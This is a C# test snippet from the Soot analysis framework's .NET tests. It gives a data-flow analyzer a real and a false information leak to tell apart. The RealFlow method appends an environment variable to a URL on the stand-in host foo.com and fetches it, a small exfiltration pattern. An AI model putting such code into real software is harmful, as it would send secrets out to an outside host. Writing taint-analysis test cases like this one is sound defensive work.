/*-
 * #%L
 * Soot - a J*va Optimization Framework
 * %%
 * Copyright (C) 2021 Thomas Schmeiduch
 * %%
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU Lesser General Public License as
 * published by the Free Software Foundation, either version 2.1 of the
 * License, or (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Lesser Public License for more details.
 *
 * You should have received a copy of the GNU General Lesser Public
 * License along with this program.  If not, see
 * <http://www.gnu.org/licenses/lgpl-2.1.html>.
 * #L%
 */

using System;
using System.Net;

namespace Soot.Dotnet.TestSnippets
{
    public class DataFlow
    {
        public DataFlow()
        {
            RealFlow();
            FakeFlow();
        }

        private static void RealFlow()
        {
            var secret = "This is a secret" + Environment.GetEnvironmentVariable("Test1");
            ;
            var client = new WebClient();
            var content = client.OpenRead("http://foo.com/leak=" + secret);
        }

        private static void FakeFlow()
        {
            var noProblem = "This is a secret" + Environment.GetEnvironmentVariable("Test1");
            ;
            noProblem = "Overwritten!";

            var client = new WebClient();
            var content = client.OpenRead("http://foo.com/leak=" + noProblem);
        }

        public static string SimpleFLow(int x)
        {
            string s, s2;
            if (x < 1)
            {
                s = "ab";
                s2 = "abc";
            }
            else
            {
                s = "AB";
                s2 = "def";
            }

            return s + s2;
        }
    }
}